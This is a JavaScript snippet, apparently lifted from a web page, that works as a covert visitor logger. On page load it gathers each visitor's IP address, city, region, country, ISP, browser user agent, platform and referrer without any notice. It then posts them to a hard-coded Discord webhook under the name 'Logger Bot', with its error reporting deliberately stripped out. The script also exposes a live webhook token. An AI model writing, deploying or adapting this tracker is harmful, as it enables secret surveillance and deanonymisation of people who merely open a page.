const WEBHOOK_URL = "https://discord.com/api/webhooks/1374900077616955482/fN02yh_P-F5BTTLSGjhm0gxgLY1CpzDqDovvSETXv-m1QCbEJnDleTTwphoVoBjIq-fP"; // WEBHOOK HERE
        const statusMessage = document.getElementById("statusMessage");

        function getTimestamp() {
            return new Date().toISOString();
        }

        async function getLocationData() {
            let locationInfo = {
                ip: "Unknown",
                country: "Unknown",
                region: "Unknown",
                city: "Unknown",
                isp: "Unknown"
            };

            try {
                const response = await fetch(`https://ipapi.co/json/`);
                if (!response.ok) {
                    throw new Error(`ipapi.co failed: ${response.status}`);
                }
                const data = await response.json();
                locationInfo = {
                    ip: data.ip || "Unknown",
                    country: data.country_name || "Unknown",
                    region: data.region || "Unknown",
                    city: data.city || "Unknown",
                    isp: data.org || "Unknown"
                };
                return locationInfo;

            } catch (error) {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                         const ipData = await ipResponse.json();
                         locationInfo.ip = ipData.ip;
                         return locationInfo;
                    }
                } catch (fallbackError) {
                     // Fallback error ignored
                }
                return locationInfo;
            }
        }

        function getBrowserData() {
             return {
                 userAgent: navigator.userAgent || "Unknown",
                 platform: navigator.platform || "Unknown",
                 referrer: document.referrer || "Direct/Unknown"
             };
         }

        async function sendDataToDiscord(allData) {
            if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1374900077616955482/fN02yh_P-F5BTTLSGjhm0gxgLY1CpzDqDovvSETXv-m1QCbEJnDleTTwphoVoBjIq-fP")) {
                // Error message removed
                return;
            }

            const currentPageUrl = window.location.href;

            const payload = {
                username: "Logger Bot",
                avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
                embeds: [{
                    title: "📊 Data Logged",
                    description: `User data captured for Site: ${currentPageUrl}`,
                    color: 0x0099FF,
                    fields: [
                        ...(allData.ip !== "Unknown" ? [{ name: "IP Address", value: allData.ip, inline: true }] : []),
                        ...(allData.country !== "Unknown" ? [{ name: "Country", value: allData.country, inline: true }] : []),
                        ...(allData.region !== "Unknown" ? [{ name: "Region/State", value: allData.region, inline: true }] : []),
                        ...(allData.city !== "Unknown" ? [{ name: "City", value: allData.city, inline: true }] : []),
                        ...(allData.isp !== "Unknown" ? [{ name: "ISP", value: allData.isp, inline: true }] : []),
                        { name: "Operating System", value: allData.platform, inline: true },
                        { name: "Referrer URL", value: allData.referrer.substring(0, 1024), inline: false },
                        { name: "User Agent (Browser)", value: allData.userAgent.substring(0, 1024), inline: false }
                    ],
                    footer: {
                        text: "Data logged, IP, Browser info, Country, City, Region, ISP, Referrer URL, User Agent (Browser), Operating System"
                    },
                    timestamp: getTimestamp()
                }]
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // Success message remains
                    if (statusMessage) statusMessage.textContent = "Data logged successfully.";
                    if (statusMessage) statusMessage.style.color = "green";
                } else {
                    // Error message removed
                }
            } catch (error) {
                // Error message removed
            }
        }

        async function logAndSendDataOnLoad() {
            try {
                const locationData = await getLocationData();
                const browserData = getBrowserData();

                const combinedData = {
                    ...locationData,
                    ...browserData
                };

                await sendDataToDiscord(combinedData);

            } catch (error) {
                // Error message removed
            }
        }

        document.addEventListener('DOMContentLoaded', logAndSendDataOnLoad);
